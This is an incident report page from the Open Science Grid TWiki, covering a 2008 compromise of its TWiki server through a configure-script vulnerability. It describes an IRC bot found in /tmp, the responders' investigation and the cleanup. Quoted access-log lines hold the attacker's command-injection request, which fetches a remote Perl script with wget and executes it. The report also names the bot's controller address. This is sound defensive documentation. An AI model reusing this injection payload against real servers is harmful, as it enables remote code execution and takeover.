%META:TOPICINFO{author="JimBasney" date="1225471020" format="1.1" reprev="1.1" version="1.1"}%
%META:TOPICPARENT{name="IncidentInformation2008"}%
%TOC%
---+ OSG-SEC-2008-10-26

The apache user on the OSG TWiki server was compromised using a known TWiki vulnerability on Sunday, October 26. 
The vulnerability was exploitable for a short period on Sunday while maintenance was being performed on the server. 
The compromise was detected on Monday, October 27. 
The intruder had installed an IRC bot system in the apache account. 
There is no indication that the intruder targeted the TWiki service itself for attack (i.e., there were no unauthorized TWiki page changes).

---++ Status

   * *Status*: CLOSED 
   * *Lead*: Jim Basney
   * *Responders*: Rob Quick, Tom Lee, Kyle Gross
   * *References*: GOC Ticket # 5897

---++ Analysis

   * *Severity*: Medium (impact on core service, grid stability not at risk)
   * *Urgency*: High (high priority effort during business hours to recover)

---++ Mitigation Plan

---+++ Actions to take

TWiki administrator(s) will wipe the server Thursday afternoon and
reinstall with upgraded TWiki software that resolves the vulnerability.

---+++ How to monitor progress

Rob Quick will report when the TWiki re-install/upgrade is complete.

---+++ Acceptable response time estimate

It is estimated this incident can be resolved this week.

---+++ List of affected parties

GOC will notify TWiki users of the scheduled downtime required to
upgrade the TWiki software. Approximately 2hrs downtime is expected.

---+++ Definition of End Of Event

TWiki system is re-installed and operational.

---++ Incident Log

Sun Oct 26 - Compromise occurred during TWiki maintenance.

Mon Oct 27 - Compromise detected. Compromised account cleaned.

Thu Oct 30 - TWiki system re-installed with latest TWiki software (containing a resolution for the vulnerability).

Fri Oct 31 - Incident closed and report submitted.

---++ Site Incident Report

<verbatim>
Some person or persons unknown recently took advantage of a security hole in
the TWiki software that allowed them to run arbitrary code as the 'apache'
user on the Open Science Grid's TWiki server.  They seem to have used this
access to start up an IRC bot.  What else they did with this access, if
anything, is unknown at this time.

Around 2:30 pm yesterday (Monday, Oct. 27, 2008), during a meeting, one of the
OSG Grid Operations Center's system administrators, echism, noticed
that the OSG TWiki server's performance was unusually slow.  Investigating
the server (huey.uits.iupui.edu), I first noticed that the load average on
that server had increased by a significant but consistent amount starting
approximately 2 pm the previous day
(Sunday, Oct. 26, 2008).

Looking closer, I noticed that there was a process, run by the 'apache' user,
that the 'top' utility was reporting to be taking up 100% of the CPU time.
The process was unusual in that 'top' reported it to be a 'perl' process (no
command-line arguments) while 'ps' reported that the process was
running '/usr/sbin/apache/log' ... but there is no /usr/sbin/apache
directory.  This was the first thing that aroused my suspicions that this was
a breakin as opposed to a bugged script run amok.

The first thing I did here was to renice +19 the process, so it would stop
slowing down the operation of the TWiki.  Then I looked further.

The PID was 11719, so I looked in /proc/11719.  /proc/11719/loginuid was
30496, which is the UID of agopu, one of the OSG GOC developers.  He
confirmed my thought that this was not something he was doing, as his work
usually has little or nothing to do with this server, and the system logs
didn't show him having logged in more recently than Oct. 8.  But looking at
more processes with that same UID in their loginuid file, as well as looking
at processes whose /proc/*/cmdline, /proc/*/exe, and /proc/*/status didn't
match, revealed a number of other anomalous processes, most called 'httpd',
but one that was called '/tmp/.t/bash'.

The /tmp/.t directory (which I since have archived and deleted) looked like
this:

-rwxr-xr-x 1 apache apache  305 Oct 27 19:00 1
-rwxr-xr-x 1 apache apache  305 Oct 27 19:00 2
-rwxr-xr-x 1 apache apache  305 Oct 27 19:00 3
-rwxr-xr-x 1 apache apache  305 Oct 27 19:00 4
-rwxr-xr-x 1 apache apache   16 Aug 30  2007 a
-rwxr-xr-x 1 apache apache  323 Aug 30  2007 autorun
-rwx--x--x 1 apache apache 681K Aug  8  2006 bash
-rw-r--r-- 1 apache apache 3.0K Oct 27 19:40 crazy.seen
-rw-r--r-- 1 apache apache   41 Oct 27 18:22 cron.d
-rwx--x--x 1 apache apache 417K Aug  8  2006 httpd
-rw-r--r-- 1 apache apache 5.1K Oct 27 19:40 IceMan.seen
-rw-r--r-- 1 apache apache 3.6K Oct 27 19:40 ice.seen
-rw-r--r-- 1 apache apache 3.5K Oct 27 19:40 kiss.seen
-rwxr-xr-x 1 apache apache 1.2K Oct 27 18:45 LinkEvents
-rw-r--r-- 1 apache apache    8 Oct 27 18:22 mech.dir
-rwxr-xr-x 1 apache apache 171K Mar 21  2005 pico
drwxr-xr-x 2 apache apache 4.0K Oct 23  2005 randfiles
-rwxr-xr-x 1 apache apache   35 May 31 08:36 run
-rw-r--r-- 1 apache apache 1.1K Oct 27 19:00 time.levels
-rw------- 1 apache apache    6 Oct 27 18:22 time.pid
-rw-r--r-- 1 apache apache 2.9K Oct 27 19:00 time.session
-rwxr-xr-x 1 apache apache 8.2K Oct  5 16:42 time.set
-rwxr--r-- 1 apache apache  157 Oct 27 18:22 update
-rwxr-xr-x 1 apache apache  28K Aug 30  2007 xh

It is abundantly clear from the contents of these files (archives available on
request) that this is an IRC bot system designed to hide (though not very
well) on a webserver.  It had installed an entry in the apache user's crontab
to issue a SIGCHLD to the process whose PID was stored in time.pid once per
minute.  There were also some files in /tmp itself that were probably
installed at the same time; they have also been archived and deleted.

Additionally, a 'netstat' revealed that the process had an open TCP connection
to 85.214.19.91:9999, which resolves to a hostname 'elsner-park.de'.

According to kagross, who is the OSG GOC's primary TWiki authority,  this
version of the TWiki software (4.2.0) had been discovered to have a security
flaw allowing a user to cause the Apache server to execute arbitrary code by
manipulating the /usr/local/twiki/bin/configure script.  The suggested remedy
was to upgrade the TWiki to the latest version (4.2.3), but there were other
suggestions, including a change to /usr/local/twiki/bin/.htaccess.  However,
although this fix seems to have correctly limited access on the testbed TWiki
server, it does not seem to work on the live server, a fact that kagross had
already discovered, which was why he had changed the permissions
on /usr/local/twiki/bin/configure to 0400, prohibiting anyone from executing
this script and thus plugging the security hole.

However, this meant that nobody including he could configure the TWiki, so he
had to change the permissions back when he was working on it, which he was
doing on Oct. 26 when the attack occurred.  He was able to point out the exact
time when it occurred by looking through the
log, /var/log/httpd/twiki.grid.iu.edu-access_log:

140.109.177.220 - - [26/Oct/2008:16:07:20
+0000] "GET //twiki/bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainhttp://www.moppedtreffen.de/ic
on/id.txt?? HTTP/1.1" 401 44
140.109.177.220 - - [26/Oct/2008:16:07:20
+0000] "GET /twiki/bin/view/Documentation//twiki/bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainh
ttp://www.moppedtreffen.de/icon/id.txt?? HTTP/1.1" 302 -
140.109.177.220 - - [26/Oct/2008:16:07:20
+0000] "GET /twiki/bin/view//twiki/bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainhttp://www.mopp
edtreffen.de/icon/id.txt?? HTTP/1.1" 302 -
140.109.177.220 - - [26/Oct/2008:16:07:21
+0000] "GET /twiki/bin/view/Documentation//bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainhttp://
www.moppedtreffen.de/icon/id.txt?? HTTP/1.1" 302 -
140.109.177.220 - - [26/Oct/2008:16:07:21
+0000] "GET /twiki/bin/view//bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainhttp://www.moppedtref
fen.de/icon/id.txt?? HTTP/1.1" 302 -
140.109.177.220 - - [26/Oct/2008:16:07:21
+0000] "GET /bin/oops/Documentation//twiki/bin/Configure?action=image;image=%7Cwget%20http%3A%2F%2Ficeman.ro%2F3.txt%20-O%20%2Ftmp%2F3.txt%3Bperl%20%2Ftmp%2F3.txt%7C;type=t
ext%2Fplainhttp%3A%2F%2Fwww.moppedtreffen.de%2Ficon%2Fid.txt%3F%3F;template=oopsaccessdenied;def=no_such_web;param1=view;template=oopsaccessdenied;def=no_such_web;param1=view
HTTP/1.1" 200 6548
140.109.177.220 - - [26/Oct/2008:16:07:21
+0000] "GET /bin/oops/twiki/bin/Configure?action=image;image=%7Cwget%20http%3A%2F%2Ficeman.ro%2F3.txt%20-O%20%2Ftmp%2F3.txt%3Bperl%20%2Ftmp%2F3.txt%7C;type=text%2Fplainhttp
%3A%2F%2Fwww.moppedtreffen.de%2Ficon%2Fid.txt%3F%3F;template=oopsaccessdenied;def=no_such_web;param1=view;template=oopsaccessdenied;def=no_such_web;param1=view
HTTP/1.1" 200 6390
140.109.177.220 - - [26/Oct/2008:16:07:22
+0000] "GET /bin/oops/bin/Configure?action=image;image=%7Cwget%20http%3A%2F%2Ficeman.ro%2F3.txt%20-O%20%2Ftmp%2F3.txt%3Bperl%20%2Ftmp%2F3.txt%7C;type=text%2Fplainhttp%3A%2F
%2Fwww.moppedtreffen.de%2Ficon%2Fid.txt%3F%3F;template=oopsaccessdenied;def=no_such_web;param1=view;template=oopsaccessdenied;def=no_such_web;param1=view
HTTP/1.1" 200 6336
140.109.177.220 - - [26/Oct/2008:16:07:22
+0000] "GET /bin/oops/Documentation//bin/Configure?action=image;image=%7Cwget%20http%3A%2F%2Ficeman.ro%2F3.txt%20-O%20%2Ftmp%2F3.txt%3Bperl%20%2Ftmp%2F3.txt%7C;type=text%2F
plainhttp%3A%2F%2Fwww.moppedtreffen.de%2Ficon%2Fid.txt%3F%3F;template=oopsaccessdenied;def=no_such_web;param1=view;template=oopsaccessdenied;def=no_such_web;param1=view
HTTP/1.1" 200 6454
140.109.177.220 - - [26/Oct/2008:16:07:21
+0000] "GET //bin/configure?action=image;image=%7Cwget%20http://iceman.ro/3.txt%20-O%20/tmp/3.txt%3Bperl%20/tmp/3.txt%7C;type=text/plainhttp://www.moppedtreffen.de/icon/id.
txt?? HTTP/1.1" 200 -

Thus it seems that the original incident occurred at 2008/10/26 16:07:21 UTC.

kagross has moved the configure script entirely out of /usr/local/twiki/bin,
and I have archived and deleted the files I mentioned, deleted the crontab
entry, stopped Apache, killed all processes run by the 'apache' user, and
restarted Apache.  Neither I nor anyone else has been able to find any
unauthorized changes to the system other than what is noted above, but we
intend to wipe the server Thursday afternoon and reinstall, just in case.  If
you are interested you may inspect the system, or the file dumps we intend to
make before wiping.  Let me know.

-- 
Tom Lee
System Administrator, Grid Infrastructure
</verbatim>

---++ Summary

   * *Final Report*: [[https://osg-docdb.opensciencegrid.org:440/cgi-bin/ShowDocument?docid=791][OSG !DocDB Document 791]]

---++ Access Control

_Uncomment the appropriate access control policy for this incident page. Logout of the twiki and try to access the page to ensure it is not publicly accessible. Do not attach files, as they will not be protected (see  [[http://twiki.org/cgi-bin/view/TWiki/TWikiAccessControl#Controlling_access_to_Attachment][http://twiki.org/cgi-bin/view/TWiki/TWikiAccessControl#Controlling_access_to_Attachment]])._

Incident information accessible by Security Team members and GOC only:
   * #Set ALLOWTOPICVIEW = Main.SecurityTeamGroup, Main.GocGroup
   * #Set ALLOWTOPICCHANGE = Main.SecurityTeamGroup, Main.GocGroup

Incident information accessible by all authenticated twiki users:
   * Set ALLOWTOPICVIEW = Main.GridGroup
   * Set ALLOWTOPICCHANGE = Main.GridGroup
